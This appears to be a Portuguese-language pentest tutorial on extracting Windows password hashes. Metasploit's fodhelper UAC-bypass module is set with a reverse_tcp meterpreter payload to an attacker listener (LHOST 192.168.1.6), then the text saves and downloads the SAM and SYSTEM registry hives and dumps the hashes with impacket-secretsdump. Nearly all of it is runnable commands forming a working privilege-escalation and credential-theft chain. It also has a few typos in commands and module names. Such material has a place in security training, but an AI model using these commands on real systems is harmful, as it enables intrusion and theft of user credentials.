<h1 align="center"> Obtendo hashes em sistemas modernos</h1>
<hr>

No cenario agora , vamos ter permissao apenas de um usuario comum para vermos a importancia de termos acesso administrativo no host.

Se tentar trazer os hashes com hashdump no metasploit como usuario como nao vamos conseguir, porque a gente nao tem acesso privilegiado para conseguir essas infos.

```
meterpreter>getuid
Server name: DESKTOP>JKHS312\Usuario
meterpreter>hashdump
[-] priv_passwd_get_sam_hashes:Operation failed: The parameter is incorret.
```
Ja que nao temos privilegios para executar esta funcao , temos que escalar nosso privilegio (UAC) para obtermos esses hashes .

Entao podemos pesquisar no metasploit por `uac` e ele vai mostrar todos os modulos que ele tem pra dar uma especie de bypass em uac.

```sh
meterpreter>seach uac
```

Um modulo bom de se usar seria o `bypassuac_foldhelper`

```sh
msf5> use exploit/windows/local/bypassuac_fodhelper
msf5> exploit(windows/local/bypassuac_fodhelper)> set session <SESSION>
msf5> exploit(windows/local/bypassuac_fodhelper)> show targets
msf5> exploit(windows/local/bypassuac_fodhelper)> set target 1
msf5> exploit(windows/local/bypassuac_fodhelper)> set payload windows/x64/meterpreter/reverse_tcp
msf5> exploit(windows/local/bypassuac_fodhelper)> set LPORT 4545
msf5> exploit(windows/local/bypassuac_fodhelper)> set LHOST 192.168.1.6
msf5> exploit(windows/local/bypassuac_fodhelper) > exploit
```

Agora podemos salvar os hashes , depois de bypassar o UAC:

```sh
meterpreter> shell
C:\Windows\system32>cd \
C:\> reg save hklm\sam sam10
C:\> reg save hklm\system system10

exit
meterpreter> download sam10 system10
```

E agora nos temos os hashes dos usuarios , mas ainda alem vamos usar o IMPACKET

```sh
impacket-secretsdump -sam sam10 -system system10 LOCAL
```
